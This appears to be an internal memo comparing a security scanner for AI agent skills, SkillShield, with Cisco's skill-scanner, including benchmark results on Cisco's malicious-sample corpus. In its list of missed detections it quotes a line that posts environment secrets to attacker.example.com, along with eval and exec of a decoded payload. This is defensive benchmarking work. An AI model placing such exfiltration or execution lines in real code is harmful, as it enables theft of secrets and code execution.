# Competitive Analysis: Cisco AI Defense Skill Scanner

Date: 2026-02-26

Reference repo: [cisco-ai-defense/skill-scanner](https://github.com/cisco-ai-defense/skill-scanner)

## What they already have

- Multi-engine architecture (static, YARA, behavioral/dataflow, LLM, meta, cloud analyzers).
- Mature CLI and output formats (`summary/json/markdown/table/sarif/html`), plus API server and pre-commit integration.
- Policy system (strict/balanced/permissive, severity overrides, disabled rules, scoping).
- Large test/eval harness with curated malicious and safe skill samples.

Evidence:

- `/Users/karimrahimov/Desktop/skill-scanner-cisco/README.md:126`
- `/Users/karimrahimov/Desktop/skill-scanner-cisco/FEATURE.md`
- `/Users/karimrahimov/Desktop/skill-scanner-cisco/evals/skills`
- `/Users/karimrahimov/Desktop/skill-scanner-cisco/tests`

## LLM model status in their repo

- README quick start still shows old default:
  - `SKILL_SCANNER_LLM_MODEL="claude-3-5-sonnet-20241022"`
  - `/Users/karimrahimov/Desktop/skill-scanner-cisco/README.md:104`
- Runtime constants/config also default to the same model:
  - `/Users/karimrahimov/Desktop/skill-scanner-cisco/skill_scanner/config/constants.py:50`
  - `/Users/karimrahimov/Desktop/skill-scanner-cisco/skill_scanner/config/config.py:38`
- Their docs also mention provider-routed Sonnet 4 strings in some places:
  - `/Users/karimrahimov/Desktop/skill-scanner-cisco/docs/reference/dependencies-and-llm-providers.md:87`

Conclusion: they have mixed model references, but no Haiku default in the main config path.

## Benchmark: SkillShield vs Cisco eval corpus

SkillShield results on Cisco eval sets:

- Before supporting-file analysis:
  - `evals/skills`: scanned 11, findings 1 (high), high/critical skills 1
  - `evals/test_skills`: scanned 4, findings 3 (`critical: 1`, `high: 2`), high/critical skills 1
- After supporting-file analysis + `eval/exec` rules:
  - `evals/skills`: scanned 11, findings 25 (`critical: 20`, `high: 5`), high/critical skills 6
  - `evals/test_skills`: scanned 4, findings 9 (`critical: 5`, `high: 4`), high/critical skills 2

Notable miss examples (malicious behavior in script files not detected by current SkillShield pipeline):

1. Exfil via Python script:
   - `/Users/karimrahimov/Desktop/skill-scanner-cisco/evals/skills/data-exfiltration/environment-secrets/get_info.py:56`
   - `requests.post("https://attacker.example.com/secrets", ...)`
2. Command injection:
   - `/Users/karimrahimov/Desktop/skill-scanner-cisco/evals/skills/command-injection/eval-execution/calculate.py:25`
   - `eval(expression)`
3. Obfuscated code execution:
   - `/Users/karimrahimov/Desktop/skill-scanner-cisco/evals/skills/obfuscation/base64-payload/process.py:31`
   - `exec(decoded)`

Root cause:

- Previously, SkillShield analyzers primarily inspected `SKILL.md` text/code blocks.
- Current version now scans supporting script files and reports file-accurate findings, reducing that gap.

## Recommended next steps (priority)

1. Add precision controls for script scanning (docstring/comment suppression and context-aware matching) to reduce false positives.
2. Add a benchmark command that runs against Cisco `evals/skills` and reports recall/precision deltas.
3. Implement LLM analyzer in runtime (already documented, currently not wired in CLI path).
4. Add policy profiles (`strict`, `balanced`) to tune noise for real-world API-heavy skills.
5. Add richer supporting-file analyzers (taint flow across files, unsafe sink/source correlation).
